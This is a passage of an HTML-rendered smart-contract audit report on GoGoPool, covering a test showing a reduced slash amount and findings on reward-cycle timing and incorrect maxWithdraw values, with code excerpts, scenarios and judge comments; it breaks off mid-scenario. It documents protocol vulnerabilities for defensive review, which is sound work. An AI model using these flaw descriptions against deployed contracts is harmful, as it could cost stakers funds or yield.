class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getIndexOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">status</span><span class=\"mtk1\">, </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MinipoolStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Withdrawable</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxTotalRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxLiquidStakerRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTotalAVAXLiquidStakerAmt</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssigned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipoolCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// very small slash amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertLt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ggpSlashAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0.000_01</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertGt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">0.000_01</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<h3 id=\"tools-used-9\" style=\"position:relative;\"><a href=\"#tools-used-9\" aria-label=\"tools used 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>vs code, forge</p>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Regardless if Rialto will fail this or not, I recommend that the <code>duration</code> passed is validated to be within <code>14 days</code> and <code>365 days</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/492#issuecomment-1413678353\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to a lack of check, a duration below 14 days can be set, this could also be used to reduce the slash penalty.</p>\n<p>I believe that in reality, such a pool will be closed via <code>recordStakingError</code>, however, this enables a grief that could impact the Protocol in a non-trivial manner.</p>\n<p>For this reason, I believe the most appropriate severity to be Medium.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Added bounds for duration passed by Node Operator: <a href=\"https://github.com/multisig-labs/gogopool/pull/38\">multisig-labs/gogopool#38</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/57\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/39\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-15-wrong-reward-distribution-between-early-and-late-depositors-because-of-the-late-syncrewards-call-in-the-cycle-syncreward-logic-should-be-executed-in-each-withdraw-or-deposits-without-reverting\" style=\"position:relative;\"><a href=\"#m-15-wrong-reward-distribution-between-early-and-late-depositors-because-of-the-late-syncrewards-call-in-the-cycle-syncreward-logic-should-be-executed-in-each-withdraw-or-deposits-without-reverting\" aria-label=\"m 15 wrong reward distribution between early and late depositors because of the late syncrewards call in the cycle syncreward logic should be executed in each withdraw or deposits without reverting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/478\">[M-15] Wrong reward distribution between early and late depositors because of the late <code>syncRewards()</code> call in the cycle, <code>syncReward()</code> logic should be executed in each withdraw or deposits (without reverting)</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/478\">unforgiven</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/863\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/835\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/812\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/796\">Breeje</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/731\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/730\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/655\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/506\">kiki_dev</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/445\">koxuan</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/380\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/376\">ck</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/361\">btk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/310\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/180\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/154\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/134\">0x73696d616f</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/99\">Rolezn</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L88-L109\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L88-L109</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166-L178\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166-L178</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L180-L189\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L180-L189</a></p>\n<p>Function <code>syncRewards()</code> distributes rewards to TokenggAVAX holders, it linearly distribute cycle’s rewards from <code>block.timestamp</code> to the cycle end time which is next multiple of the <code>rewardsCycleLength</code> (the end time of the cycle is defined and the real duration of the cycle changes). when a cycle ends <code>syncRewards()</code> should be called so the next cycle starts but if <code>syncRewards()</code> doesn’t get called fast, then users depositing or withdrawing funds before call to <code>syncRewards()</code> would lose their rewards and those rewards would go to users who deposited funds after <code>syncRewards()</code> call. contract should try to start the next cycle whenever deposit or withdraw happens to make sure rewards are distributed fairly between users.</p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>syncRewards()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction syncRewards() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint32 timestamp = block.timestamp.safeCastTo32();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (timestamp &lt; rewardsCycleEnd) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert SyncError();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint192 lastRewardsAmt_ = lastRewardsAmt;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 totalReleasedAssets_ = totalReleasedAssets;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 stakingTotalAssets_ = stakingTotalAssets;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 nextRewardsAmt = (asset.balanceOf(address(this)) + stakingTotalAssets_) - totalReleasedAssets_ - lastRewardsAmt_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tlastRewardsAmt = nextRewardsAmt.safeCastTo192();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tlastSync = timestamp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\trewardsCycleEnd = nextRewardsCycleEnd;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\ttotalReleasedAssets = totalReleasedAssets_ + lastRewardsAmt_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\temit NewRewardsCycle(nextRewardsCycleEnd, nextRewardsAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>As you can see whenever this function is called it starts the new cycle and sets the end of the cycle to the next multiple of the <code>rewardsCycleLength</code> and it release the rewards linearly between current timestamp and cycle end time. So if <code>syncRewards()</code> get called near to multiple of the <code>rewardsCycleLength</code> then rewards would be distributed with higher speed in less time. The problem is that users depositing funds before call <code>syncRewards()</code> won’t receive new cycles rewards and early depositing won’t get considered in reward distribution if deposits happen before <code>syncRewards()</code> call and if a user withdraws his funds before the <code>syncRewards()</code> call then he receives no rewards.</p>\n<p>Imagine this scenario:</p>\n<ol>\n<li><code>rewardsCycleLength</code> is 10 days and the rewards for the next cycle is <code>100</code> AVAX.</li>\n<li>the last cycle has been ended and user1 has <code>10000</code> AVAX deposited and has 50% of the pool shares.</li>\n<li><code>syncRewards()</code> don’t get called for 8 days.</li>\n<li>users1 withdraws his funds receive <code>10000</code> AVAX even so he deposits for 8 days in the current cycle.</li>\n<li>users2 deposit <code>1000</code> AVAX and get 10% of pool shares and the user2 would call <code>syncRewards()</code> and contract would start distributing <code>100</code> avax as reward.</li>\n<li>after 2 days cycle would finish and user2 would receive <code>100 * 10% = 10</code> AVAX as rewards for his <code>1000</code> AVAX deposit for 2 days but user1 had <code>10000</code> AVAX for 8 days and would receive 0 rewards.</li>\n</ol>\n<p>So rewards won’t distribute fairly between depositors across the time and any user interacting with contract before the <code>syncRewards()</code> call can lose his rewards. Contract won’t consider deposit amounts and duration before <code>syncRewards()</code> call and it won’t make sure that <code>syncRewards()</code> logic would be executed as early as possible with deposit or withdraw calls when a cycle ends.</p>\n<h3 id=\"tools-used-10\" style=\"position:relative;\"><a href=\"#tools-used-10\" aria-label=\"tools used 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>One way to solve this is to call <code>syncRewards()</code> logic in each deposit or withdraw and make sure that cycles start as early as possible (the revert “SyncError()” in the <code>syncRewards()</code> should be removed for this).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/478#issuecomment-1382098984\">emersoncloud (GoGoPool) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I think that medium severity is more appropriate. User funds aren’t drained or lost, but liquid staking rewards may be unfairly calculated. </p>\n<p>Good find. I think there is something we could do to either incentivize the <code>syncRewards</code> call or call it on deposit and withdraw. </p>\n<p>But I disagree with the concept that the user who staked for 8 days is entitled to rewards for staking. Rewards depend on properly running minipools. Reward amounts can fluctuate depending on the utilization of liquid staking funds by minipools. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/478#issuecomment-1401657682\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>After some more discussion, this is working as designed. And Rialto will call <code>syncRewards</code> at the start of each reward cycle, so the possible loss to the user who withdraws before <code>syncRewards</code> was supposed to be called is mitigated.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/478#issuecomment-1415624850\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown a potential risk for end-users that withdraw before <code>syncRewards</code> is called.</p>\n<p>Because the finding pertains to a loss of yield, I believe the finding to be of Medium Severity.</p>\n<p>While Rialto may call this as a perfect actor, we cannot guarantee that a end user could forfeit some amount of yield, due to external conditions.</p>\n<p>I believe this finding to potentially be a nofix, as long as all participants are aware of the mechanic.</p>\n<p>Per discussions had on <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/99\">#99</a>, I don’t believe that any specific MEV attack has been identified, however this finding does highlight a potential risk that a mistimed withdrawal could cause.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/478#issuecomment-1421430629\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged.</p>\n<p>Not fixing but will add a note in our docs.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-16-maxwithdraw-and-maxredeem-doesnt-return-correct-value-which-can-make-other-contracts-fail-while-working-with-protocol\" style=\"position:relative;\"><a href=\"#m-16-maxwithdraw-and-maxredeem-doesnt-return-correct-value-which-can-make-other-contracts-fail-while-working-with-protocol\" aria-label=\"m 16 maxwithdraw and maxredeem doesnt return correct value which can make other contracts fail while working with protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/476\">[M-16] <code>maxWithdraw()</code> and <code>maxRedeem()</code> doesn’t return correct value which can make other contracts fail while working with protocol</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/476\">unforgiven</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L215-L223\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L215-L223</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L205-L213\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L205-L213</a></p>\n<p>Functions <code>maxWithdraw()</code> and <code>maxRedeem()</code> returns max amount of assets or shares owner would be able to withdraw taking into account liquidity in the TokenggAVAX contract, but logics don’t consider that when user withdraws the withdrawal amounts subtracted from <code>totalReleasedAssets</code> (in <code>beforeWithdraw()</code> function) so the maximum amounts that can user withdraws should always be lower than <code>totalReleasedAssets</code> (which shows all the deposits and withdraws) but because functions <code>maxWithdraw()</code> and <code>maxRedeem()</code> uses <code>totalAssets()</code> to calculate available AVAX which includes deposits and current cycle rewards so those functions would return wrong value (whenever the return value is bigger than <code>totalReleaseAssets</code> then it would be wrong).</p>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>beforeWithdraw()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction beforeWithdraw(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 /* shares */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t) internal override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\ttotalReleasedAssets -= amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>This is <code>beforeWithdraw()</code> code which is called whenever users withdraws their funds and as you can see the amount of withdrawal assets subtracted from <code>totalReleaseAssets</code> so withdrawal amounts can never be bigger than <code>totalReleaseAssets</code>. This is <code>maxWithdraw()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction maxWithdraw(address _owner) public view override returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (getBool(keccak256(abi.encodePacked(&quot;contract.paused&quot;, &quot;TokenggAVAX&quot;)))) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\treturn 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 assets = convertToAssets(balanceOf[_owner]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 avail = totalAssets() - stakingTotalAssets;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturn assets &gt; avail ? avail : assets;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>As you can see to calculate available AVAX in the contract address code uses <code>totalAssets() - stakingTotalAssets</code> and <code>totalAssets()</code> shows deposits + current cycle rewards so <code>totalAssets()</code> is bigger than <code>totalReleaseAssets</code> and the value of the <code>totalAssets() - stakingTotalAssets</code> can be bigger than <code>totalReleaseAssets</code> and if code returns <code>avail</code> as answer then the return value would be wrong.</p>\n<p>Imagine this scenario:</p>\n<ol>\n<li><code>totalReleaseAssets</code> is <code>10000</code> AVAX.</li>\n<li><code>stakingTotalAssets</code> is 